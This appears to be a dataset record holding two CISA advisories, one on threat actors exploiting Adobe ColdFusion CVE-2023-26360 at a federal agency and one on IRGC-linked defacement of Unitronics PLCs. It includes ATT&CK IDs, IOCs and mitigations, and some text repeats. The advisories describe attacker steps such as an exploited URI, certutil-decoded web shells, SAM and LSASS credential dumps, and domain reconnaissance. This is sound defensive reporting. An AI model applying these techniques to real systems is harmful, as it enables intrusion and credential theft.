Implement network segmentation to separate network segments based on role and functionality [2.E]. Proper network segmentation significantly reduces the ability for threat actor lateral movement by controlling traffic flows between—and access to—various subnetworks. See CISA’s Layering Network Security Through Segmentation infographic and the National Security Agency’s (NSA’s) Segment Networks and Deploy Application-Aware Defenses.
Deploy application-aware network defenses to block improperly formed traffic and restrict content, according to policy and legal authorizations. Traditional intrusion detection systems (IDS) based on known-bad signatures are quickly decreasing in effectiveness due to encryption and obfuscation techniques. Threat actors hide malicious actions and remove data over common protocols, making the need for sophisticated, application-aware defensive mechanisms critical for modern network defenses.

Application Control

Enforce signed software execution policies. Use a modern operating system that enforces signed software execution policies for scripts, executables, device drivers, and system firmware. Maintain a list of trusted certificates to prevent and detect the use and injection of illegitimate executables. Execution policies, when used in conjunction with a secure boot capability, can assure system integrity.
Application control should be used with signed software execution policies to provide greater control. Allowing unsigned software enables threat actors to gain a foothold and establish persistence through embedded malicious code. See NSA’s Enforce Signed Software Execution Policies.

Manage Accounts, Permissions, and Workstations

Require phishing-resistant multifactor authentication (MFA) [2.H] for all services to the extent possible, particularly for webmail, VPN, and accounts that access critical systems.
Implement the principle of least privilege to decrease threat actors’ abilities to access key network resources.
Restrict file and directory permissions. Use file system access controls to protect folders such as C:\Windows\System32.
Restrict NTLM authentication policy settings, including incoming NTLM traffic from client computers, other member servers, or a domain controller.[8]

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 2-9).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA recommends continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

NIST: CVE-2023-26360
CISA: KEV Catalog
CISA, MITRE: Best Practices for MITRE ATT&CK Mapping
CISA: Decider Tool
CISA: Cross-Sector Cybersecurity Performance Goals
CISA: Secure by Design and Default
CISA: Layering Network Security Through Segmentation
NSA: Segment Networks and Deploy Application-Aware Defenses
NSA: Enforce Signed Software Execution Policies
CISA: Implementing Phishing-Resistant MFA

REFERENCES
[1] Packet Storm Security: Adobe ColdFusion Unauthenticated Remote Code Execution[2] MITRE: certutil[3] VirusTotal: File - a3acb9f79647f813671c1a21097a51836b0b95397ebc9cd178bc806e1773c864[4] Bleeping Computer: Stealthy New JavaScript Malware Infects Windows PCs with RATs[5] GitHub: Tas9er/ByPassGodzilla[6] MITRE: esentutl[7] Microsoft: Active Directory - SYSVOL[8] Microsoft: Restrict NTLM - Incoming NTLM Traffic
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. CISA does not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA.
VERSION HISTORY
December 5, 2023: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1083', 'T1003.002', 'T1505.003', 'T1482', 'T1190', 'T1087.002', 'T1484.001', 'T1036.005', 'T1105', 'T1082', 'T1087.001', 'T1003.001', 'T1140', 'T1564.001', 'T1070.004', 'T1046', 'T1518', 'T1059.007', 'T1016.001', 'T1071.001', 'T1036.008'}","






Actions to take today to mitigate malicious cyber activity:




Prioritize remediating known exploited vulnerabilities.
Employ proper network segmentation.
Enable multifactor authentication (MFA) for all services to the extent possible, particularly for webmail, VPN, and accounts that access critical systems.







SUMMARY
The Cybersecurity and Infrastructure Security Agency (CISA) is releasing a Cybersecurity Advisory (CSA) in response to confirmed exploitation of CVE-2023-26360 by unidentified threat actors at a Federal Civilian Executive Branch (FCEB) agency. This vulnerability presents as an improper access control issue impacting Adobe ColdFusion versions 2018 Update 15 (and earlier) and 2021 Update 5 (and earlier). CVE-2023-26360 also affects ColdFusion 2016 and ColdFusion 11 installations; however, they are no longer supported since they reached end of life. Exploitation of this CVE can result in arbitrary code execution. Following the FCEB agency’s investigation, analysis of network logs confirmed the compromise of at least two public-facing servers within the environment between June and July 2023.
This CSA provides network defenders with tactics, techniques, and procedures (TTPs), indicators of compromise (IOCs), and methods to detect and protect against similar exploitation.
Download the PDF version of this report:


AA23-339A Threat Actors Exploit Adobe ColdFusion CVE-2023-26360 for Initial Access to Government Servers
(PDF,       449.49 KB
  )


For a downloadable copy of IOCs, see:


AA23-339A STIX XML
(XML,       23.83 KB
  )




AA23-339A STIX JSON
(JSON,       23.29 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for tables mapped to the threat actors’ activity.
Overview
Adobe ColdFusion is a commercial application server used for rapid web-application development. ColdFusion supports proprietary markup languages for building web applications and integrates external components like databases and other third-party libraries. ColdFusion uses a proprietary language, ColdFusion Markup Language (CFML), for development but the application itself is built using JAVA.
In June 2023, through the exploitation of CVE-2023-26360, threat actors were able to establish an initial foothold on two agency systems in two separate instances. In both incidents, Microsoft Defender for Endpoint (MDE) alerted of the potential exploitation of an Adobe ColdFusion vulnerability on public-facing web servers in the agency’s pre-production environment. Both servers were running outdated versions of software which are vulnerable to various CVEs. Additionally, various commands were initiated by the threat actors on the compromised web servers; the exploited vulnerability allowed the threat actors to drop malware using HTTP POST commands to the directory path associated with ColdFusion.
Analysis suggests that the malicious activity conducted by the threat actors was a reconnaissance effort to map the broader network. No evidence is available to confirm successful data exfiltration or lateral movement during either incident. Note: It is unknown if the same or different threat actors were behind each incident.
Incident 1
As early as June 26, 2023, threat actors obtained an initial foothold on a public-facing, web server running Adobe ColdFusion v2016.0.0.3 through exploitation of CVE-2023-26360. Threat actors successfully connected from malicious IP address 158.101.73,.,241. Disclaimer: CISA recommends organizations investigate or vet this IP address prior to taking action, such as blocking. This IP resolves to a public cloud service provider and possibly hosts a large volume of legitimate traffic.
The agency’s correlation of Internet Information Services (IIS) logs against open source,1, information indicates that the identified uniform resource identifier (URI) /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc was used to exploit CVE-2023-26360. The agency removed the asset from the network within 24 hours of the MDE alert.
Threat actors started process enumeration to obtain currently running processes on the web server and performed a network connectivity check, likely to confirm their connection was successful. Following additional enumeration efforts to obtain information about the web server and its operating system, the threat actors checked for the presence of ColdFusion version 2018,—previous checks were also conducted against version 2016.
Threat actors were observed traversing the filesystem, and uploading various artifacts to the web server, to include deleting the file tat.cfm,. Note: This file was deleted prior to the victim locating it on the host for analysis. Its characteristics and functionality are unknown. In addition:

Certutil,2, was run against conf.txt, and decoded as a web shell (config.jsp),. Conf.txt was subsequently deleted, likely to evade detection.Note: Threat actors were only observed interacting with the config.jsp web shell from this point on.
HTTP POST requests, were made to config.cfm, an expected configuration file in a standard installation of ColdFusion,. Code review of config.cfm indicated malicious code—intended to execute on versions of ColdFusion 9 or less—was inserted with the intent to extract username, password, and data source uniform resource locators (URLs). According to analysis, this code insertion could be used in future malicious activity by the threat actors (e.g., by using the valid credentials that were compromised). This file also contained code used to upload additional files by the threat actors; however, the agency was unable to identify the source of their origin.
Threat actors attempted to run attrib.exe to hide the newly created config.jsp web shell,. Analysis of this phase found no indication of successful execution.
A small subset of events generated from various ColdFusion application logs identified that tat.cfm, config.jsp, and system.cfm failed to execute on the host due to syntax errors.

Threat actors created various files (see Table 1 below) in the C:\IBM directory using the initialization process coldfusion.exe. None of these files were located on the server (possibly due to threat actor deletion) but are assessed as likely threat actor tools. Analysts assessed the C:\IBM directory as a staging folder to support threat actors’ malicious operations.
Disclaimer: Organizations are encouraged to investigate the use of these files for related signs of compromise prior to performing remediation actions. Two artifacts are legitimate Microsoft files; threat actors were observed using these files following initial compromise for intended malicious purposes.

Note: The malicious code found on the system during this incident contained code that, when executed, would attempt to decrypt passwords for ColdFusion data sources. The seed value included in the code is a known value for ColdFusion version 8 or older—where the seed value was hard-coded. A threat actor who has control over the database server can use the values to decrypt the data source passwords in ColdFusion version 8 or older. The victim’s servers were running a newer version at the time of compromise; thus, the malicious code failed to decrypt passwords using the default hard-coded seed value for the older versions.
Incident 2
As early as June 2, 2023, threat actors obtained an initial foothold on an additional public-facing web server running Adobe ColdFusion v2021.0.0.2 via malicious IP address 125.227.50,.,97 through exploitation of CVE-2023-26360. Threat actors further enumerated domain trusts to identify lateral movement opportunities, by using nltest commands. The threat actors also collected information about local, and domain, administrative user accounts while performing reconnaissance by using commands such as localgroup, net user, net user /domain, and ID. Host and network reconnaissance efforts were further conducted to discover network configuration, time logs, and query user information.
Threat actors were observed dropping the file d.txt—decoded as d.jsp—via POST command in addition to eight malicious artifacts (hiddenfield.jsp, hiddenfield_jsp.class, hiddenfield_jsp.java, Connection.jsp, Connection_jsp.class, Connection_jsp.java, d_jsp.class, and d_jsp.java/). According to open source information, d.jsp is a remote access trojan (RAT) that utilizes a JavaScript loader, to infect the device and requires communication with the actor-controlled server to perform actions.,4, The agency’s analysis identified the trojan as a modified version of a publicly available web shell code.,5, After maintaining persistence, threat actors periodically tested network connectivity by pinging Google’s domain name system (DNS),. The threat actors conducted additional reconnaissance efforts via searching for the .jsp files that were uploaded.
Threat actors attempted to exfiltrate the (Registry) files sam.zip, sec.zip, blank.jsp, and cf-bootstrap.jar. Windows event logs identified the actors were not successful due to the malicious activity being detected and quarantined. An additional file (sys.zip) was created on the system; however, there were no indications of any attempt to exfiltrate it. Analysis identified these files resulted from executed save and compress data processes from the HKEY_LOCAL_MACHINE (HKLM) Registry key, as well as save security account manager (SAM), information to .zip files. The SAM Registry file may allow for malicious actors to obtain usernames and reverse engineer passwords; however, no artifacts were available to confirm that the threat actors were successful in exfiltrating the SAM Registry hive.
Windows event logs show that a malicious file (1.dat) was detected and quarantined. Analysis determined this file was a local security authority subsystem service (LSASS) dump, file that contained user accounts—to include multiple disabled credentials—and Windows new technology LAN manager (NTLM) passwords. The accounts were found on multiple servers across the victim’s network and were not successfully used for lateral movement.
As efforts for reconnaissance continued, the threat actors changed their approach to using security tools that were present on the victim server. Esentutl.exe,6, was used to attempt this registry dump. Attempts to download data from the threat actors’ command and control (C2) server were also observed but blocked and logged by the victim server. Threat actors further attempted to access SYSVOL, which is used to deliver policy and logon scripts to domain members on an agency domain controller,. The attempt was unsuccessful. Had the attempt succeeded, the threat actors may have been able to change policies across compromised servers.,7,
Note: During this incident, analysis strongly suggests that the threat actors likely viewed the data contained in the ColdFusion seed.properties file via the web shell interface. The seed.properties file contains the seed value and encryption method used to encrypt passwords. The seed values can also be used to decrypt passwords. No malicious code was found on the victim system to indicate the threat actors attempted to decode any passwords using the values found in seed.properties file. Versions of ColdFusion 9 or greater use the seed.properties file, which contains unique seed values that can only be used on a single server.
MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 2-9 for all referenced threat actor tactics and techniques for enterprise environments in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.








MITIGATIONS
CISA recommends organizations implement the mitigations below to improve your organization’s cybersecurity posture based on threat actor activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
These mitigations apply to all critical infrastructure organizations and network defenders. CISA recommends that software manufacturers incorporate secure-by-design and -default principles and tactics into their software development practices, limiting the impact of threat actor techniques and strengthening the security posture for their customers. For more information on secure by design, see CISA’s Secure by Design webpage.
Manage Vulnerabilities and Configurations

Upgrade all versions affected by this vulnerability. Keep all software up to date and prioritize patching according to CISA’s Known Exploited Vulnerabilities Catalog,1.E,.
Prioritize remediation of vulnerabilities on internet-facing systems, for example, by conducting continuous automated and/or routine vulnerability scans.
Prioritize secure-by-default configurations such as eliminating default passwords, implementing single sign-on (SSO) technology via modern open standards. This also includes disabling default credentials.

Segment Networks

Employ proper network segmentation, such as a demilitarized zone (DMZ),2.F,. The end goal of a DMZ network is to allow an organization to access untrusted networks, such as the internet, while ensuring its private network or local area network (LAN) remains secure. Organizations typically store external-facing services and resources—as well as servers used for DNS, file transfer protocol (FTP), mail, proxy, voice over internet protocol (VoIP)—and web servers in the DMZ.
Use a firewall or web-application firewall (WAF) and enable logging,2.G, 2.T, to prevent/detect potential exploitation attempts. Review ingress and egress firewall rules and block all unapproved protocols. Limit risky (but approved) protocols through rules.
Implement network segmentation to separate network segments based on role and functionality,2.E,. Proper network segmentation significantly reduces the ability for threat actor lateral movement by controlling traffic flows between—and access to—various subnetworks. See CISA’s Layering Network Security Through Segmentation infographic and the National Security Agency’s (NSA’s) Segment Networks and Deploy Application-Aware Defenses.
Deploy application-aware network defenses to block improperly formed traffic and restrict content, according to policy and legal authorizations. Traditional intrusion detection systems (IDS) based on known-bad signatures are quickly decreasing in effectiveness due to encryption and obfuscation techniques. Threat actors hide malicious actions and remove data over common protocols, making the need for sophisticated, application-aware defensive mechanisms critical for modern network defenses.

Application Control

Enforce signed software execution policies. Use a modern operating system that enforces signed software execution policies for scripts, executables, device drivers, and system firmware. Maintain a list of trusted certificates to prevent and detect the use and injection of illegitimate executables. Execution policies, when used in conjunction with a secure boot capability, can assure system integrity.
Application control should be used with signed software execution policies to provide greater control. Allowing unsigned software enables threat actors to gain a foothold and establish persistence through embedded malicious code. See NSA’s Enforce Signed Software Execution Policies.

Manage Accounts, Permissions, and Workstations

Require phishing-resistant multifactor authentication (MFA),2.H, for all services to the extent possible, particularly for webmail, VPN, and accounts that access critical systems.
Implement the principle of least privilege to decrease threat actors’ abilities to access key network resources.
Restrict file and directory permissions. Use file system access controls to protect folders such as C:\Windows\System32.
Restrict NTLM authentication policy settings, including incoming NTLM traffic from client computers, other member servers, or a domain controller.,8,

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 2-9).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA recommends continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

NIST: CVE-2023-26360
CISA: KEV Catalog
CISA, MITRE: Best Practices for MITRE ATT&CK Mapping
CISA: Decider Tool
CISA: Cross-Sector Cybersecurity Performance Goals
CISA: Secure by Design and Default
CISA: Layering Network Security Through Segmentation
NSA: Segment Networks and Deploy Application-Aware Defenses
NSA: Enforce Signed Software Execution Policies
CISA: Implementing Phishing-Resistant MFA

REFERENCES,1, Packet Storm Security: Adobe ColdFusion Unauthenticated Remote Code Execution,2, MITRE: certutil,3, VirusTotal: File - a3acb9f79647f813671c1a21097a51836b0b95397ebc9cd178bc806e1773c864,4, Bleeping Computer: Stealthy New JavaScript Malware Infects Windows PCs with RATs,5, GitHub: Tas9er/ByPassGodzilla,6, MITRE: esentutl,7, Microsoft: Active Directory - SYSVOL,8, Microsoft: Restrict NTLM - Incoming NTLM Traffic
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. CISA does not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA.
VERSION HISTORY
December 5, 2023: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-339a
11,"






Actions to take today to mitigate malicious activity:




Implement multifactor authentication.
Use strong, unique passwords.
Check PLCs for default passwords.







SUMMARY
The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), National Security Agency (NSA), Environmental Protection Agency (EPA), and the Israel National Cyber Directorate (INCD)—hereafter referred to as ""the authoring agencies""—are disseminating this joint Cybersecurity Advisory (CSA) to highlight continued malicious cyber activity against operational technology devices by Iranian Government Islamic Revolutionary Guard Corps (IRGC)-affiliated Advanced Persistent Threat (APT) cyber actors.
The IRGC is an Iranian military organization that the United States designated as a foreign terrorist organization in 2019. IRGC-affiliated cyber actors using the persona “CyberAv3ngers” are actively targeting and compromising Israeli-made Unitronics Vision Series programmable logic controllers (PLCs). These PLCs are commonly used in the Water and Wastewater Systems (WWS) Sector and are additionally used in other industries including, but not limited to, energy, food and beverage manufacturing, and healthcare. The PLCs may be rebranded and appear as different manufacturers and companies. In addition to the recent CISA Alert, the authoring agencies are releasing this joint CSA to share indicators of compromise (IOCs) and tactics, techniques, and procedures (TTPs) associated with IRGC cyber operations.
Since at least November 22, 2023, these IRGC-affiliated cyber actors have continued to compromise default credentials in Unitronics devices. The IRGC-affiliated cyber actors left a defacement image stating, “You have been hacked, down with Israel. Every equipment ‘made in Israel’ is CyberAv3ngers legal target.” The victims span multiple U.S. states. The authoring agencies urge all organizations, especially critical infrastructure organizations, to apply the recommendations listed in the Mitigations section of this advisory to mitigate risk of compromise from these IRGC-affiliated cyber actors.
This advisory provides observed IOCs and TTPs the authoring agencies assess are likely associated with this IRGC-affiliated APT. For more information on Iranian state-sponsored malicious cyber activity, see CISA’s Iran Cyber Threat Overview and Advisories webpage and the FBI’s Iran Threat webpage.
For a PDF version of this CSA, see: 


AA23-335A IRGC-Affiliated Cyber Actors Exploit PLCs in Multiple Sectors, Including U.S. Water and Wastewater Systems Facilities
(PDF,       594.03 KB
  )


For a downloadable copy of IOCs, see:


AA23-335A STIX XML
(XML,       15.50 KB
  )




AA23-335A STIX JSON
(JSON,       10.84 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See Table 1 for threat actor activity mapped to MITRE ATT&CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Overview
CyberAv3ngers (also known as CyberAveng3rs, Cyber Avengers) is an Iranian IRGC cyber persona that has claimed responsibility for numerous attacks against critical infrastructure organizations.[1],[2],[3],[4],[5] The group claimed responsibility for cyberattacks in Israel beginning in 2020. CyberAv3ngers falsely claimed they compromised several critical infrastructure organizations in Israel.[2] CyberAv3ngers also reportedly has connections to another IRGC-linked group known as Soldiers of Solomon.
(Updated December 14, 2023) Most recently, CyberAv3ngers began targeting U.S.-based WWS facilities that operate Unitronics PLCs.[1] The threat actors compromised Unitronics Vision Series PLCs with human machine interfaces (HMI). These compromised devices were publicly exposed to the internet with default passwords and by default are on TCP port 20256. On December 11, 2023, CVE-2023-6448 was assigned to address the default passwords [CWE-798: Use of Hard Coded Credentials], and CISA added the CVE to its Known Exploited Vulnerabilities Catalog. On December 12, Unitronics released VisiLogic version 9.9.00 software to address this CVE; the update requires users to change default passwords.
These PLC and related controllers are often exposed to outside internet connectivity due to the remote nature of their control and monitoring functionalities. The compromise is centered around defacing the controller’s user interface and may render the PLC inoperative. With this type of access, deeper device and network level accesses are available and could render additional, more profound cyber physical effects on processes and equipment. It is not known if additional cyber activities deeper into these PLCs or related control networks and components were intended or achieved. Organizations should consider and evaluate their systems for these possibilities.
Threat Actor Activity
The authoring agencies have observed the IRGC-affiliated activity since at least October 2023, when the actors claimed credit for the cyberattacks against Israeli PLCs on their Telegram channel. Since November 2023, the authoring agencies have observed the IRGC-affiliated actors target multiple U.S.-based WWS facilities that operate Unitronics Vision Series PLCs. Cyber threat actors likely compromised these PLCs since the PLCs were internet-facing and used Unitronics’ default password. Observed activity includes the following:

Between September 13 and October 30, 2023, the CyberAv3ngers Telegram channel displayed both legitimate and false claims of multiple cyberattacks against Israel. CyberAv3ngers targeted Israeli PLCs in the water, energy, shipping, and distribution sectors.
On October 18, 2023, the CyberAv3ngers-linked Soldiers of Solomon claimed responsibility for compromising over 50 servers, security cameras, and smart city management systems in Israel; however, majority of these claims were proven false. The group claimed to use a ransomware named “Crucio” against servers where the webcams camera software operated on port 7001.
Beginning on November 22, 2023, IRGC cyber actors accessed multiple U.S.-based WWS facilities that operate Unitronics Vision Series PLCs with an HMI likely by compromising internet-accessible devices with default passwords. The targeted PLCs displayed the defacement message, “You have been hacked, down with Israel. Every equipment ‘made in Israel’ is Cyberav3ngers legal target.”

INDICATORS OF COMPROMISE
See Table 1 for observed IOCs related to CyberAv3nger operations.
(Updated December 14, 2023)

Table 1: CyberAv3nger IOCs


Indicator
Type
Fidelity
Description




BA284A4B508A7ABD8070A427386E93E0
MD5
Suspected
MD5 hash associated with Crucio Ransomware



66AE21571FAEE1E258549078144325DC9DD60303
 

SHA1
Suspected
SHA1 hash associated with Crucio Ransomware



440b5385d3838e3f6bc21220caa83b65cd5f3618daea676f271c3671650ce9a3
 


SHA256
 

Suspected

SHA256 hash associated with Crucio Ransomware
 



178.162.227[.]180
IP address
Suspected
IP address associated with Crucio Ransomware


185.162.235[.]206
IP address
 
IP address associated with Crucio Ransomware



MITRE ATT&CK TACTICS AND TECHNIQUES
See Table 2 for referenced threat actor tactics and techniques in this advisory.

Table 2: Initial Access


Technique Title
ID
Use




Brute Force Techniques
T1110
Threat actors obtained login credentials, which they used to successfully log into Unitronics devices and provide root-level access.



MITIGATIONS
The authoring agencies recommend critical infrastructure organizations, including WWS sector facilities, implement the following mitigations to improve your organization’s cybersecurity posture to defend against CyberAv3ngers activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
Note: The below mitigations are based on threat actor activity against Unitronics PLCs but apply to all internet-facing PLCs.
Network Defenders
The cyber threat actors likely accessed the affected devices—Unitronics Vision Series PLCs with HMI—by exploiting cybersecurity weaknesses, including poor password security and exposure to the internet. To safeguard against this threat, the authoring agencies urge organizations to consider the following:
Immediate steps to prevent attack:

(Updated December 14, 2023) Upgrade devices to 9.9.00 VisiLogic software, which requires users to change the default passwords on PLCs and HMIs. Use a strong password. For more information, see Unitronics’ blog Unitronics Cybersecurity for Vision and Samba PLC Series and Release notes for VisiLogic 9.9.00.
Disconnect the PLC from the public-facing internet.

Follow-on steps to strengthen your security posture:

Implement multifactor authentication for access to the operational technology (OT) network whenever applicable.
If you require remote access, implement a firewall and/or virtual private network (VPN) in front of the PLC to control network access. A VPN or gateway device can enable multifactor authentication for remote access even if the PLC does not support multifactor authentication.
Create strong backups of the logic and configurations of PLCs to enable fast recovery. Familiarize yourself with factory resets and backup deployment as preparation in the event of ransomware activity.
Keep your Unitronics and other PLC devices updated with the latest versions by the manufacturer.
Confirm third-party vendors are applying the above recommended countermeasures to mitigate exposure of these devices and all installed equipment.

In addition, the authoring agencies recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques, and to reduce the impact and risk of compromise by cyber threat actors:

Reduce risk exposure. CISA offers a range of services at no cost, including scanning and testing to help organizations reduce exposure to threats via mitigating attack vectors. CISA Cyber Hygiene services can help provide additional review of organizations’ internet-accessible assets. Email vulnerability@cisa.dhs.gov with the subject line, “Requesting Cyber Hygiene Services” to get started.

Device Manufacturers
Although critical infrastructure organizations using Unitronics (including rebranded Unitronics) PLC devices can take steps to mitigate the risks, it is ultimately the responsibility of the device manufacturer to build products that are secure by design and default. The authoring agencies urge device manufacturers to take ownership of the security outcomes of their customers by following the principles in the joint guide Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software, primarily:

Do not ship products with default passwords. Instead, either ship products with random initial passwords or require users to change the password upon first use.
Do not expose administrative interfaces to the internet by default, and take steps to introduce friction should a device be placed in an insecure state.
Do not charge extra for basic security features needed to operate the product securely.
Support multifactor authentication, including via phishing-resistant methods.

By using secure by design tactics, software manufacturers can make their product lines secure “out of the box” without requiring customers to spend additional resources making configuration changes, purchasing tiered security software and logs, monitoring, and making routine updates.
For more information on common misconfigurations and guidance on reducing their prevalence, see joint advisory NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations. For more information on secure by design, see CISA’s Secure by Design and Default webpage and joint guide.
VALIDATE SECURITY CONTROLS
In addition to applying mitigations, the authoring agencies recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Table 2).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

The authoring agencies recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

EPA: Cybersecurity for the Water Sector
CISA: Water and Wastewater Systems Sector
CISA Alert: Exploitation of Unitronics PLCs used in Water and Wastewater Systems
CISA: Iran Cyber Threat Overview and Advisories
FBI: The Iran Threat - Web Page
CISA, MITRE: Best Practices for MITRE ATT&CK Mapping
CISA: Decider Tool
CISA: Cross-Sector Cybersecurity Performance Goals
CISA: Cyber Hygiene Services
CISA: Shifting the Balance of Cybersecurity Risk - Principles and Approaches for Secure by Design Software
CISA: Secure by Design Alert - How Software Manufacturers Can Shield Web Management Interfaces from Malicious Cyber Activity
CISA, NSA: NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
CISA: Secure by Design and Default

REPORTING
All organizations should report suspicious or criminal activity related to information in this CSA to CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870). The FBI encourages recipients of this document to report information concerning suspicious or criminal activity to their local FBI field office or IC3.gov. For NSA client requirements or general cybersecurity inquiries, contact Cybersecurity_Requests@nsa.gov.
Additionally, the WaterISAC encourages members to share information by emailing analyst@waterisac.org, calling 866-H2O-ISAC, or using the online incident reporting form. State, local, tribal, and territorial governments should report incidents to the MS-ISAC (SOC@cisecurity.org or 866-787-4722).
REFERENCES

CBS News: Municipal Water Authority of Aliquippa hacked by Iranian-backed cyber group
Industrial Cyber: Digital Battlegrounds - Evolving Hybrid Kinetic Warfare
Bleeping Computer: Israel's Largest Oil Refinery Website Offline After DDoS Attack
Dark Reading: Website of Israeli Oil Refinery Taken Offline by Pro-Iranian Attackers
X: @CyberAveng3rs

DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. The authoring agencies do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the authoring agencies.
VERSION HISTORY
December 1, 2023: Initial version.December 14, 2023: Added CVE, patch information, and IOC descriptions.






This product is provided subject to this Notification and this Privacy & Use policy.


",{'T1110'},"






Actions to take today to mitigate malicious activity:




Implement multifactor authentication.
Use strong, unique passwords.
Check PLCs for default passwords.







SUMMARY
The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), National Security Agency (NSA), Environmental Protection Agency (EPA), and the Israel National Cyber Directorate (INCD)—hereafter referred to as ""the authoring agencies""—are disseminating this joint Cybersecurity Advisory (CSA) to highlight continued malicious cyber activity against operational technology devices by Iranian Government Islamic Revolutionary Guard Corps (IRGC)-affiliated Advanced Persistent Threat (APT) cyber actors.
The IRGC is an Iranian military organization that the United States designated as a foreign terrorist organization in 2019. IRGC-affiliated cyber actors using the persona “CyberAv3ngers” are actively targeting and compromising Israeli-made Unitronics Vision Series programmable logic controllers (PLCs). These PLCs are commonly used in the Water and Wastewater Systems (WWS) Sector and are additionally used in other industries including, but not limited to, energy, food and beverage manufacturing, and healthcare. The PLCs may be rebranded and appear as different manufacturers and companies. In addition to the recent CISA Alert, the authoring agencies are releasing this joint CSA to share indicators of compromise (IOCs) and tactics, techniques, and procedures (TTPs) associated with IRGC cyber operations.
Since at least November 22, 2023, these IRGC-affiliated cyber actors have continued to compromise default credentials in Unitronics devices. The IRGC-affiliated cyber actors left a defacement image stating, “You have been hacked, down with Israel. Every equipment ‘made in Israel’ is CyberAv3ngers legal target.” The victims span multiple U.S. states. The authoring agencies urge all organizations, especially critical infrastructure organizations, to apply the recommendations listed in the Mitigations section of this advisory to mitigate risk of compromise from these IRGC-affiliated cyber actors.
This advisory provides observed IOCs and TTPs the authoring agencies assess are likely associated with this IRGC-affiliated APT. For more information on Iranian state-sponsored malicious cyber activity, see CISA’s Iran Cyber Threat Overview and Advisories webpage and the FBI’s Iran Threat webpage.
For a PDF version of this CSA, see: 


AA23-335A IRGC-Affiliated Cyber Actors Exploit PLCs in Multiple Sectors, Including U.S. Water and Wastewater Systems Facilities
(PDF,       594.03 KB
  )


For a downloadable copy of IOCs, see:


AA23-335A STIX XML
(XML,       15.50 KB
  )




AA23-335A STIX JSON
(JSON,       10.84 KB
  )


TECHNICAL DETAILS
